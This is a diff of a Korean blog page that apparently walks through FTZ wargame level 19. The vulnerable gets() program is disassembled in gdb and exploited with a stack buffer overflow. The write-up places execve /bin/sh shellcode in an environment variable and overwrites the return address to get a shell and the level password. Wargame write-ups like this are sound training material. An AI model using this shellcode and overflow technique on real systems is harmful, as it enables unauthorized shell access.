@@ -6,14 +6,17 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta property="og:type" content="article">
+    <meta name="description" content="Level 19Description123456main()&#123;	char buf[20];	gets(buf);	printf(&quot;%s\n&quot;, buf);&#125;  Analyze123char buf[20];gets(buf);printf(&quot;%s\n&quot;, buf); 뭐 더 없이 이전과 동일한 bof를 일으켜 해결할 수 있을 것으">
+<meta property="og:type" content="article">
 <meta property="og:title" content="FTZ : level 19">
 <meta property="og:url" content="https://bintab1e.github.io/2024/10/06/ftz/FTZ-level-19/index.html">
 <meta property="og:site_name" content="bintab1e">
+<meta property="og:description" content="Level 19Description123456main()&#123;	char buf[20];	gets(buf);	printf(&quot;%s\n&quot;, buf);&#125;  Analyze123char buf[20];gets(buf);printf(&quot;%s\n&quot;, buf); 뭐 더 없이 이전과 동일한 bof를 일으켜 해결할 수 있을 것으">
 <meta property="og:locale" content="ko_KR">
 <meta property="article:published_time" content="2024-10-06T13:13:05.000Z">
-<meta property="article:modified_time" content="2024-10-06T13:13:05.812Z">
+<meta property="article:modified_time" content="2024-10-06T14:32:51.864Z">
 <meta property="article:author" content="bintab1e">
+<meta property="article:tag" content="ftz">
 <meta name="twitter:card" content="summary">
     
     
@@ -111,6 +114,10 @@
     </div>
     
     
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-19"><span class="toc-number">1.</span> <span class="toc-text">Level 19</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li></ol>
+      </div>
+    
   </span>
 </div>
 
@@ -140,15 +147,35 @@
 
 
       
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pwnable/">pwnable</a>
+    </div>
+
 
       
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ftz/" rel="tag">ftz</a>
+    </div>
+
 
     </div>
   </header>
   
 
   <div class="content e-content" itemprop="articleBody">
-    
+    <h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">20</span>];</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buf[20];</span><br><span class="line">gets(buf);</span><br><span class="line">printf(&quot;%s\n&quot;, buf);</span><br></pre></td></tr></table></figure>
+<p>뭐 더 없이 이전과 동일한 bof를 일으켜 해결할 수 있을 것으로 보인다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[level19@ftz level19]$ gdb -q attackme</span><br><span class="line">(gdb) set disassembly-flavor intel</span><br><span class="line">(gdb) disas main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">0x08048440 &lt;main+0&gt;:    push   ebp</span><br><span class="line">0x08048441 &lt;main+1&gt;:    mov    ebp,esp</span><br><span class="line">0x08048443 &lt;main+3&gt;:    sub    esp,0x28</span><br><span class="line">0x08048446 &lt;main+6&gt;:    sub    esp,0xc</span><br><span class="line">0x08048449 &lt;main+9&gt;:    lea    eax,[ebp-40]</span><br><span class="line">0x0804844c &lt;main+12&gt;:   push   eax</span><br><span class="line">0x0804844d &lt;main+13&gt;:   call   0x80482f4 &lt;gets&gt;</span><br><span class="line">0x08048452 &lt;main+18&gt;:   add    esp,0x10</span><br><span class="line">0x08048455 &lt;main+21&gt;:   sub    esp,0x8</span><br><span class="line">0x08048458 &lt;main+24&gt;:   lea    eax,[ebp-40]</span><br><span class="line">0x0804845b &lt;main+27&gt;:   push   eax</span><br><span class="line">0x0804845c &lt;main+28&gt;:   push   0x80484d8</span><br><span class="line">0x08048461 &lt;main+33&gt;:   call   0x8048324 &lt;printf&gt;</span><br><span class="line">0x08048466 &lt;main+38&gt;:   add    esp,0x10</span><br><span class="line">0x08048469 &lt;main+41&gt;:   leave</span><br><span class="line">0x0804846a &lt;main+42&gt;:   ret</span><br><span class="line">0x0804846b &lt;main+43&gt;:   nop</span><br><span class="line">0x0804846c &lt;main+44&gt;:   nop</span><br><span class="line">0x0804846d &lt;main+45&gt;:   nop</span><br><span class="line">0x0804846e &lt;main+46&gt;:   nop</span><br><span class="line">0x0804846f &lt;main+47&gt;:   nop</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>ebp-40 가 buf의 시작으로 보이고, 44바이트를 임의로 채우고 4바이트를 환경변수 주소로 return address를 덮어 해결할 수 있다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[level19@ftz level19]$ export EGG=`python -c &#x27;print&quot;\x90&quot;*15+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80&quot;&#x27;`</span><br><span class="line">[level19@ftz tmp]$ echo &#x27;int main() &#123;printf(&quot;0x%x\n&quot;, getenv(&quot;EGG&quot;));&#125;&#x27; &gt; test.c</span><br><span class="line">[level19@ftz tmp]$ gcc test.c -o test</span><br><span class="line">[level19@ftz tmp]$ ./test</span><br><span class="line">0xbffffc8f</span><br></pre></td></tr></table></figure>
+<p>다음과 같이 환경변수에 쉘코드를 넣고 환경변수의 주소를 알아낸다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[level19@ftz level19]$ (python -c &#x27;print &quot;\x90&quot;*44+&quot;\x8f\xfc\xff\xbf&quot;&#x27;; cat) | ./attackme</span><br><span class="line">üÿ¿</span><br><span class="line">my-pass</span><br><span class="line">TERM environment variable not set.</span><br><span class="line"></span><br><span class="line">Level19 Password is &quot;swimming in pink&quot;.</span><br></pre></td></tr></table></figure>
+<p>위와 같이 보내어 패스워드를 획득 !</p>
+
   </div>
 </article>
 
@@ -174,6 +201,10 @@
 
     
     
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Level-19"><span class="toc-number">1.</span> <span class="toc-text">Level 19</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Description"><span class="toc-number">1.1.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.2.</span> <span class="toc-text">Analyze</span></a></li></ol></li></ol>
+      </div>
+    
 
     <div id="share-footer" style="display: none">
       <ul>
@@ -194,6 +225,8 @@
 
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
         
         <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
